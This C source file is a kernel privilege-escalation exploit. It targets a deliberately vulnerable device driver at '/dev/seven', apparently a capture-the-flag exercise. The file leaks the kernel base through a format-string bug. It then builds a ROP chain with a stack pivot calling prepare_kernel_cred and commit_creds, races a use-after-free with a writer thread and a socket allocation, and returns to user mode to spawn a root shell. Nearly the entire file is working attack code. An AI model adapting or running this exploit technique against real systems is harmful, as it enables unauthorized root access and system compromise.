#include <stdio.h>
#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/socket.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/mman.h>

int fd;

// We can launch ioctl / read / write for this device driver.
// For ioctl command we have:
// 0x6666 for UAF
// 0x7777 for Fmt string vuln
// 0x5555 alloc of size 0x80

#define ALLOC 	0x5555
#define UAF		0x6666
#define GET		0x7777


struct trap_frame{
	char* rip;
	unsigned long cs;
	unsigned long rflags;
	char* rsp;
	unsigned long ss;
}__attribute__((packed));

struct trap_frame tf;

void save_state(void){
	asm volatile(   "mov tf+8, cs;"
			"pushf;"
			"pop tf+16;"
			"mov tf+24, rsp;"
			"mov tf+32, ss;"
			);

}


void open_target(void)
{
	fd = open("/dev/seven", O_RDWR);
	assert(fd > 0);
}

int lock;

void *memset_buf(void *tmp)
{
	
	unsigned long buf[4];
	for(int i = 0; i < 4; i++){
		buf[i] = (unsigned long)tmp;
	}
	/*
	char buf[0x81];
	memset(buf, 'M', 0x80);
	*/
	lock = 1;
	while(1)
	{
		write(fd, buf, 0x20);
	}
	return tmp;
}

void shell(void){
	char* argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);

}

void setup_chunk_rop(unsigned long kernel_base)
{
	unsigned long *rop;
	int i = (0x1000000/2)/8;
	unsigned long commit_creds = kernel_base + (0xffffffff8108c360 - 0xffffffff81000000);
	unsigned long prepare_kernel_cred = kernel_base + (0xffffffff8108c780 - 0xffffffff81000000);
	unsigned long pop_rdi = kernel_base + 0x16e9;
	unsigned long mov_rdi_rax = kernel_base + (0xffffffff813d7369 - 0xffffffff81000000);
	unsigned long mov_rdi_rax_rep = kernel_base + (0xffffffff81aed04b - 0xffffffff81000000);
	unsigned long pop_rcx = kernel_base + (0xffffffff8101ed83 - 0xffffffff81000000);
	unsigned long mov_cr3_rdi = kernel_base + (0xffffffff8105734a -0xffffffff81000000); //: mov cr3, rdi ; ret
	unsigned long or_rax_rdx = kernel_base + (0xffffffff81018d2c -0xffffffff81000000); //: or rax, rdx ; ret
	unsigned long pop_rdx = kernel_base + (0xffffffff8104abb7-0xffffffff81000000); // pop rdx; ret
	unsigned long pop_rax = kernel_base + (0xffffffff8100ec67-0xffffffff81000000); // pop rax; ret
	unsigned long mov_rax_cr3 = kernel_base + (0xffffffff81057fab-0xffffffff81000000); //: mov rax, cr3 ; mov cr3, rax ; ret
	unsigned long mov_cr3_rax = kernel_base + (0xffffffff81057fae - 0xffffffff81000000);//: mov cr3, rax ; ret
	unsigned long swapgs = kernel_base + (0xffffffff81c00f58 - 0xffffffff81000000);
	unsigned long iretq = kernel_base + (0xffffffff81024f92 - 0xffffffff81000000);
	unsigned long swapgs_restore = kernel_base + (0xffffffff81c00e26 - 0xffffffff81000000);



	/*
	   	0xffffffff816e19bc:	mov    esp,0x83000000
   		0xffffffff816e19c1:	ret 
	*/
	unsigned long pivot = kernel_base + 0x6e19bc;

	
	rop = mmap(0x83000000-(0x1000000/2), 0x1000000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	for (int i = 0; i < 0x4 + (0x1000000/2)/8;)
		rop[i++] = 0xffffffff816e19bc;
	
	//rop[i++] = mov_rax_cr3;
	//rop[i++] = pop_rdx;
	//rop[i++] = 0x1000;
	//rop[i++] = or_rax_rdx;
	//rop[i++] = mov_cr3_rax;
	rop[i++] = pop_rdi;
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred;
	rop[i++] = pop_rcx;
	rop[i++] = 0;
	rop[i++] = mov_rdi_rax_rep;
	rop[i++] = commit_creds;
	rop[i++] = swapgs_restore;
	rop[i++] = 0;
	rop[i++] = 0;
	rop[i++] = shell;
	rop[i++] = tf.cs;
	rop[i++] = tf.rflags;
	rop[i++] = tf.rsp;
	rop[i++] = tf.ss;
	rop[i++] = kernel_base +( 0xffffffff816e19bc - 0xffffffff81000000);
	
	printf("ROP fake stack %p\n", rop);
}

// When testing when being already root.
unsigned long get_text_base(void)
{
	char b[0x10000];
	char *p;
	int ret;
	unsigned long leak;
	int kmsg = open("/dev/kmsg", O_RDONLY);
	assert(kmsg > 0);

	ret = read(kmsg, b, 0x10000);
	assert(ret > 0);
	
	p = strchr(b, 0xff);
	leak = strtoul(p+1, NULL, 10);
	leak -= 0x1f3ecd;
	return leak;
}

int main(int argc, char *argv[])
{
	char buf[0x81];
	int ret;
	unsigned long kernel_base;

	save_state();
	// open the target device driver.
	open_target();

	ret = ioctl(fd, ALLOC, 0x80);
	assert(ret == 0);
	
	//memset(buf, 'M', 0x80);
	strcpy(buf, "data : %lld %lld %lld %lld %lld \xff%lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld\n");
	ret = write(fd, buf, 0x80);
	assert(ret > 0);

	// Trying to printk that data we wrote.
	ret = ioctl(fd, GET, 0);
	assert(ret == 0);

	// trying to have the text base!
	if (argc == 1)
		exit(1);
	else
		kernel_base = strtoul(argv[1], NULL, 16) - 0x1f3ecd;
	//kernel_base = get_text_base();
	printf("Kernel base %lx\n", kernel_base);
	setup_chunk_rop(kernel_base);
	getchar();

	// trying to fill that freed chunk with struct subprocess_info
	// Trying to bruteforce it.

	//sleep(0.1);

	// Trying to free our chunk for UAD
	ret = ioctl(fd, UAF, 0);
	assert(ret == 0);

	pthread_t tid;
	pthread_create(&tid, NULL, memset_buf, kernel_base + 0x6e19bc);
	sleep(0.3);
	for(int i = 0; i < 0x1; i++)
		ret = socket(22, AF_INET, 0);
	//write(fd, buf, 0x20);
	sleep(0.3);
	lock = 0;
	//printf("socket returned %d\n", ret);

	getchar();
}
